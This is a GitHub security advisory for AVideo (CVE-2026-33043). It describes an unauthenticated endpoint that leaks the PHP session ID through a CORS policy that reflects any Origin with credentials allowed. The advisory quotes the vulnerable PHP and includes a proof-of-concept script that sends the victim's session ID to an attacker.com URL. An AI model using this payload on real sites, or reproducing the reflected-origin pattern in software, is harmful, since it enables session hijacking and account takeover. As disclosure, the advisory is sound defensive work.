# [H] AVideo affected by Session Hijacking via Unauthenticated Session ID Disclosure with Permissive CORS

## Summary
Severity: High
Advisory: GHSA-qc3p-398r-p59j
CVE: CVE-2026-33043
CWE: CWE-942
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-qc3p-398r-p59j
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary

`/objects/phpsessionid.json.php` exposes the current PHP session ID to any unauthenticated request. The `allowOrigin()` function reflects any `Origin` header back in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`, enabling cross-origin session theft and full account takeover.

### Details

**File:** `objects/phpsessionid.json.php`

```php
allowOrigin();
$obj = new stdClass();
$obj->phpsessid = session_id();
echo _json_encode($obj);
```

No authentication is required. The `allowOrigin()` function in `objects/functions.php` (line ~2648) reflects the request Origin:

```php
$HTTP_ORIGIN = empty($_SERVER['HTTP_ORIGIN']) ? @$_SERVER['HTTP_REFERER'] : $_SERVER['HTTP_ORIGIN'];
header("Access-Control-Allow-Origin: " . $HTTP_ORIGIN);
header("Access-Control-Allow-Credentials: true");
```

This means any external website can make a credentialed cross-origin request and read the session ID.

### PoC

An attacker hosts the following page:

```html
<script>
fetch('https://TARGET/objects/phpsessionid.json.php', {
  credentials: 'include'
})
.then(r => r.json())
.then(d => {
  // d.phpsessid = victim's session ID
  document.location = 'https://attacker.com/steal?sid=' + d.phpsessid;
});
</script>
```

When a logged-in AVideo user visits the attacker's page, their PHP session ID is stolen via the permissive CORS policy, allowing the attacker to hijack their session.

### Impact

**Account Takeover** — Any logged-in user (including administrators) who visits an attacker-controlled page will have their session stolen. The attacker can then impersonate them with full privileges.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-qc3p-398r-p59j
- https://nvd.nist.gov/vuln/detail/CVE-2026-33043
- https://github.com/WWBN/AVideo/commit/9f4f51e5df5e3343400f9d0068705f5482b6f930
- https://github.com/WWBN/AVideo
